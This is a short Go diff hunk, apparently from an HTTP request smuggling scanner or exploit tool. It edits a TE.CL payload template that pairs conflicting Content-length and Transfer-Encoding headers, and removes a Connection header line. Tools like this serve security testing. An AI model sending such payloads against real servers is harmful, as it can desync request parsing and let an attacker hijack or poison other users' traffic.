@@ -9,7 +9,6 @@ import (
 var TeClPayload = []string{`POST %s HTTP/1.1
 Host: %s
 Content-Type: application/x-www-form-urlencoded%s
-Connection: Keep-Alive
 Content-length: 4
 Transfer-Encoding: chunked
 
